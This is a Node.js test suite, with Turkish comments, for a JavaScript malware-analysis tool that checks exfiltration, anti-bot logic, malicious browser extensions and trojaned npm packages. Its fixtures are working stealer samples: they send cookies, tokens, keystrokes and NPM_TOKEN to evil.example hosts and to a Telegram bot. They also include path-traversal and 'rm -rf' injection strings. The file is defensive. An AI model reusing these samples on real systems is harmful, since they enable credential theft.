// Güvenlik modülleri: exfiltration haritası, anti-bot, phishing uç noktaları, eklenti/npm arşivleri,
// varyant aileleri, değişim takibi ve olay raporu: node test/security.test.js
import assert from 'node:assert/strict';
import zlib from 'node:zlib';
import nodeCrypto from 'node:crypto';
import { getQuickJS } from 'quickjs-emscripten';
import { createHost, sandboxApi } from '../src/sandbox/core.js';
import { securityRuntime, exfilMap, phishingEndpoints, botSignals, __test } from '../src/security/runtime.js';
import { parseZip, unpackCrx, parseTar } from '../src/security/archive.js';
import { analyzeExtension } from '../src/security/extension.js';
import { metadataUrl, validatePackage, fetchPublished, compareWithPublished } from '../src/security/npm.js';
import { sampleFeatures, clusterFamilies, createCollection } from '../src/security/families.js';
import { snapshot, createTracker } from '../src/security/tracking.js';
import { incidentReport } from '../src/security/incident.js';
import { crc32 } from '../src/compress/inflate.js';

const host = createHost(await getQuickJS());
const sandbox = sandboxApi(async (msg) => host.handle(msg));

// --- E98: canary işaretleri her kodlamada bulunur
const { CANARY, findCanaries } = __test;
for (const prefix of ['', 'a', 'ab', 'abc']) {
  const enc = Buffer.from(`${prefix}c=${CANARY.cookie}&x=1`).toString('base64');
  assert.ok(findCanaries(enc).some((h) => h.source === 'cookie' && h.encoding === 'base64'), `base64 hizalama ${prefix.length}`);
}
assert.equal(findCanaries(encodeURIComponent(`k=${CANARY.storage}`))[0].source, 'storage');
assert.equal(findCanaries(Buffer.from(CANARY.cookie).toString('hex'))[0].encoding, 'hex');
assert.equal(exfilMap([{ api: 'image', url: `https://x.example/p?d=${[...CANARY.cookie].reverse().join('')}`, body: '' }])[0].encoding, 'ters');

const stealer = `
  var c = document.cookie, t = localStorage.getItem("token");
  fetch("https://collect.evil.example/c", { method: "POST", body: btoa(c) });
  new Image().src = "https://pix.evil.example/p?t=" + encodeURIComponent(t) + "&ua=" + navigator.userAgent;
  if (navigator.webdriver) { console.log("bot"); } else { fetch("https://stage2.evil.example/p.js"); }
  var u = document.querySelector("#password");
  fetch("https://api.telegram.org/bot123:ABC/sendMessage", { method: "POST", body: "password=" + (u && u.value) });
`;
const sec = await securityRuntime({ sandbox, text: stealer, code: stealer, urls: [] });
const bySource = (s) => sec.exfil.filter((e) => e.source === s);
assert.ok(bySource('cookie').some((e) => e.encoding === 'base64' && e.url.includes('collect.evil.example') && e.where === 'gövde'));
assert.ok(bySource('storage').some((e) => e.url.includes('pix.evil.example') && e.where === 'URL'));
assert.ok(bySource('userAgent').length >= 1);
// E103: headless profilde stage2 isteği yapılmıyor, konsol çıktısı farklı
assert.equal(sec.antibot.detectsBot, true);
assert.ok(sec.antibot.diff.onlyHuman.some((k) => k.includes('stage2.evil.example')));
assert.ok(sec.antibot.apis.includes('navigator.webdriver'));
assert.deepEqual(botSignals('window._pxAppId = 1; grecaptcha.execute()').vendors, ['PerimeterX (HUMAN)', 'Google reCAPTCHA']);
// E107
const tg = sec.phishing.find((p) => p.url.startsWith('https://api.telegram.org'));
assert.ok(tg && tg.kinds.includes('Telegram bot API') && tg.credentials);
assert.ok(phishingEndpoints({ code: 'x', urls: ['https://a.example/gate.php?id=1'] })[0].kinds.includes('sunucu betiği (gate)'));
// sandbox yoksa yalnızca statik sinyaller
const st = await securityRuntime({ sandbox: null, text: stealer, code: stealer });
assert.equal(st.exfil.length, 0);
assert.equal(st.antibot.diff, null);

// --- E106: ZIP / CRX3 eklenti
function zip(files) {
  const locals = [];
  const central = [];
  let off = 0;
  for (const [name, text, deflate] of files) {
    const data = Buffer.from(text);
    const body = deflate ? zlib.deflateRawSync(data) : data;
    const nameB = Buffer.from(name);
    const h = Buffer.alloc(30);
    h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt16LE(deflate ? 8 : 0, 8);
    h.writeUInt32LE(crc32(data), 14); h.writeUInt32LE(body.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(nameB.length, 26);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(deflate ? 8 : 0, 10); c.writeUInt32LE(crc32(data), 16);
    c.writeUInt32LE(body.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(nameB.length, 28); c.writeUInt32LE(off, 42);
    locals.push(h, nameB, body);
    central.push(c, nameB);
    off += 30 + nameB.length + body.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(files.length, 8); end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return new Uint8Array(Buffer.concat([...locals, cd, end]));
}
const manifest = JSON.stringify({
  manifest_version: 3, name: 'Coupon Helper', version: '1.0.2', permissions: ['cookies', 'storage', 'scripting'],
  host_permissions: ['<all_urls>'], content_scripts: [{ matches: ['<all_urls>'], js: ['cs.js'] }], background: { service_worker: 'bg.js' },
  update_url: 'https://updates.evil.example/x.xml',
});
const cs = 'document.addEventListener("keydown", e => fetch("https://k.evil.example/l?k=" + e.key)); eval(atob("YWxlcnQoMSk="));';
const ext = zip([['manifest.json', manifest, false], ['cs.js', cs, true], ['bg.js', 'chrome.cookies.getAll({}, c => fetch("https://c.evil.example", {method:"POST", body: JSON.stringify(c)}));', true]]);
assert.equal(parseZip(ext).length, 3);
const header = Buffer.alloc(12);
header.write('Cr24', 0); header.writeUInt32LE(3, 4); header.writeUInt32LE(4, 8);
const crx = new Uint8Array(Buffer.concat([header, Buffer.from([1, 2, 3, 4]), Buffer.from(ext)]));
assert.equal(unpackCrx(crx).format, 'crx3');
const a = analyzeExtension(crx);
assert.equal(a.format, 'crx3');
assert.equal(a.name, 'Coupon Helper');
assert.ok(a.permissions.some((p) => p.permission === 'cookies' && p.risk === 'high'));
assert.ok(a.permissions.some((p) => p.permission === '<all_urls>' && p.host));
assert.ok(a.findings.includes('her sayfaya içerik betiği'));
assert.ok(a.findings.some((f) => f.startsWith('mağaza dışı güncelleme adresi')));
const csScan = a.scripts.find((s) => s.name === 'cs.js');
assert.ok(csScan.apis.includes('tuş olayları') && csScan.apis.includes('dinamik kod (eval/Function)'));
assert.ok(csScan.domains.includes('k.evil.example'));
assert.equal(a.read('cs.js'), cs);
assert.equal(a.risk.level, 'high');

// --- E105: npm karşılaştırma (sahte registry, ağ yok)
assert.equal(metadataUrl('@scope/pkg', '1.2.3'), 'https://registry.npmjs.org/@scope%2Fpkg/1.2.3');
assert.ok(validatePackage('../../etc', '1.0.0'));
assert.ok(validatePackage('ok', '1.0.0; rm -rf'));
function tar(entries) {
  const parts = [];
  for (const [name, text] of entries) {
    const data = Buffer.from(text);
    const h = Buffer.alloc(512);
    h.write(name, 0); h.write('0000644\0', 100); h.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124);
    h.write('0', 156); h.write('ustar\0', 257);
    h.write('        ', 148);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
    parts.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}
const published = 'module.exports = function add(a, b) {\n  return a + b;\n};\n';
const tgz = zlib.gzipSync(tar([['package/package.json', JSON.stringify({ name: 'tiny-add', version: '1.0.0', scripts: { postinstall: 'node setup.js' } })], ['package/index.js', published]]));
assert.equal(parseTar(zlib.gunzipSync(tgz)).length, 2);
const integrity = `sha512-${nodeCrypto.createHash('sha512').update(tgz).digest('base64')}`;
const calls = [];
const fakeFetch = async (url) => {
  calls.push(url);
  if (url === 'https://registry.npmjs.org/tiny-add/1.0.0') {
    return { ok: true, json: async () => ({ name: 'tiny-add', version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tiny-add/-/tiny-add-1.0.0.tgz', integrity } }) };
  }
  if (url === 'https://registry.npmjs.org/tiny-add/-/tiny-add-1.0.0.tgz') return { ok: true, arrayBuffer: async () => tgz.buffer.slice(tgz.byteOffset, tgz.byteOffset + tgz.length) };
  return { ok: false, status: 404 };
};
const pub = await fetchPublished('tiny-add', '1.0.0', { fetchImpl: fakeFetch });
assert.equal(pub.integrity.ok, true);
assert.deepEqual(calls, ['https://registry.npmjs.org/tiny-add/1.0.0', 'https://registry.npmjs.org/tiny-add/-/tiny-add-1.0.0.tgz']);
const same = await compareWithPublished(published, pub);
assert.equal(same.identical, true);
assert.equal(same.file, 'index.js');
const trojan = `${published}require("https").get("https://exfil.evil.example/?t=" + process.env.NPM_TOKEN);\n`;
const diff = await compareWithPublished(trojan, pub, 'index.js');
assert.equal(diff.identical, false);
assert.equal(diff.addedCount, 1);
assert.deepEqual(diff.newUrls, ['https://exfil.evil.example/?t=']);
assert.ok(diff.newApis.includes('ortam değişkenleri') && diff.newApis.includes('ağ erişimi'));
assert.deepEqual(diff.installScripts, { postinstall: 'node setup.js' });
// başka hosta yönlendiren metadata reddedilir; bozuk bütünlük reddedilir
const evilFetch = async (url) => (url.endsWith('/1.0.0') ? { ok: true, json: async () => ({ dist: { tarball: 'https://evil.example/x.tgz' } }) } : { ok: false, status: 500 });
await assert.rejects(fetchPublished('tiny-add', '1.0.0', { fetchImpl: evilFetch }), /beklenmeyen tarball/);
const badFetch = async (url) => (url.endsWith('.tgz') ? fakeFetch(url) : { ok: true, json: async () => ({ dist: { tarball: 'https://registry.npmjs.org/tiny-add/-/tiny-add-1.0.0.tgz', integrity: 'sha512-AAAA' } }) });
await assert.rejects(fetchPublished('tiny-add', '1.0.0', { fetchImpl: badFetch }), /bütünlük/);

// --- E112: polimorfik varyantlar aynı aileye düşer
const v1 = 'var a = document.cookie; fetch("https://one.example/c", { method: "POST", body: a }); function z(q) { return q.split("").reverse().join(""); } console.log(z("abc"));';
const v2 = 'var Xk = document.cookie; fetch("https://two.example/c", { method: "POST", body: Xk }); function k9(w) { return w.split("").reverse().join(""); } console.log(k9("qwe"));';
const other = 'for (let i = 0; i < 10; i++) { total += prices[i] * qty[i]; } render(total);';
const col = createCollection();
col.add(sampleFeatures({ label: 'v1', output: v1, iocs: { domains: ['one.example'] } }));
col.add(sampleFeatures({ label: 'v2', output: v2, iocs: { domains: ['two.example'] } }));
col.add(sampleFeatures({ label: 'other', output: other }));
const fams = col.families();
assert.equal(fams.length, 2);
assert.deepEqual(fams[0].members.map((m) => m.label).sort(), ['v1', 'v2']);
assert.equal(fams[0].polymorphic, true);
const col2 = createCollection();
assert.equal(col2.import(col.export()), 3);
assert.equal(col2.import(col.export()), 0, 'aynı örnekler ikinci kez eklenmez');
assert.throws(() => col2.import('{"peel":"x"}'));
assert.equal(clusterFamilies([]).length, 0);

// --- E113: değişim takibi
const tracker = createTracker();
const rep1 = { iocs: { domains: ['a.example'], urls: [], ips: [] }, apis: [{ name: 'fetch' }], threat: { risk: { score: 10 }, classes: [] }, fingerprint: [] };
const rep2 = { iocs: { domains: ['a.example', 'b.evil.example'], urls: [], ips: [] }, apis: [{ name: 'fetch' }, { name: 'eval' }], threat: { risk: { score: 45 }, classes: [{ id: 'skimmer' }] }, fingerprint: [] };
assert.equal(tracker.record(snapshot({ label: 'cdn/app.js', report: rep1, output: 'a();\nb();' })), null);
const ch = tracker.record(snapshot({ label: 'cdn/app.js', report: rep2, output: 'a();\nb();\nc();' }));
assert.equal(ch.changed, true);
assert.equal(ch.linesAdded, 1);
assert.deepEqual(ch.domains.added, ['b.evil.example']);
assert.equal(ch.riskDelta, 35);
assert.ok(ch.alerts.includes('yeni ağ hedefi') && ch.alerts.includes('yeni hassas API') && ch.alerts.some((x) => x.startsWith('yeni davranış')));
const t2 = createTracker();
assert.equal(t2.import(tracker.export()), 2);
assert.equal(t2.history('cdn/app.js').length, 2);

// --- E114: olay raporu
const report = {
  iocs: { domains: ['collect.evil.example'], urls: ['https://collect.evil.example/c'], ips: [], emails: [], wallets: [], jwts: [] },
  threat: { risk: { score: 80, level: 'high' }, classes: [{ id: 'magecart', score: 70, evidence: ['ödeme alanları ve dışarı gönderim birlikte'] }], yara: 'rule x {}', ids: 'alert dns any any' },
  security: sec,
  runtime: { network: [{ api: 'fetch', method: 'POST', url: 'https://collect.evil.example/c', body: 'x' }] },
  crypto: { decrypted: [{ source: 'CryptoJS.AES.decrypt', alg: 'AES', mode: 'CBC', key: 'k', text: 'gizli' }], constants: [], keys: [] },
  encodings: [], passTimes: [{ id: 'literals', ms: 3 }], detection: { tools: [{ name: 'obfuscator.io', score: 100, evidence: ['x'] }], versions: [] },
};
const inc = await incidentReport({ report, input: 'eval("x")', output: 'x', meta: { title: 'Test' }, mask: true });
assert.match(inc.markdown, /# Olay müdahale raporu — Test/);
assert.match(inc.markdown, /Girdi SHA-256: `[0-9a-f]{64}`/);
assert.match(inc.markdown, /collect\.evil\.example/);
assert.match(inc.markdown, /PCI olay sürecini/);
assert.match(inc.markdown, /Çerezler dışarı gönderiliyor/);
const incJson = JSON.parse(inc.json);
assert.equal(incJson.risk.score, 80);
assert.equal(incJson.hashes.inputSha256.length, 64);

console.log('security: ok');
